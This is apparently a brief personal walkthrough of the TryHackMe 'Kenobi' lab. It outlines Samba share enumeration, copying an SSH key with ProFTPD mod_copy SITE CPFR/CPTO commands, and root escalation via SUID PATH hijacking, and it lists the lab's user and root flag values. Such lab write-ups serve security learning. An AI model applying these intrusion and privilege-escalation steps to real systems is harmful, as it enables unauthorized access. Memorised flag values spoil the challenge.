# Kenobi - TryHackMe

     **Date:** Dec 3, 2025
     **Time:** ~90 min

     ## Summary
     Exploited Samba anonymous share + ProFTPD mod_copy + SUID PATH hijacking.

     ## Steps
     1. Nmap: ports 21, 22, 80, 139, 445
     2. Samba enum: found kenobi SSH key in /anonymous
     3. ProFTPD SITE CPFR/CPTO commands to move key to /var/tmp
     4. SSH as kenobi
     5. Found /usr/bin/menu SUID binary
     6. PATH hijacking: export PATH=/tmp:$PATH, fake curl script
     7. Root shell

     ## Key Commands
     nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP
     nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount MACHINE_IP
     SITE CPFR SITE CPTO
     mkdir /mnt/kenobiNFS
     mount MACHINE_IP:/var /mnt/kenobiNFS
     ls -la /mnt/kenobiNFS


     ## Flags
     User: d0b0f3f53b6caa532a83915e19224899
     Root: 177b3cd8562289f37382721c28381f02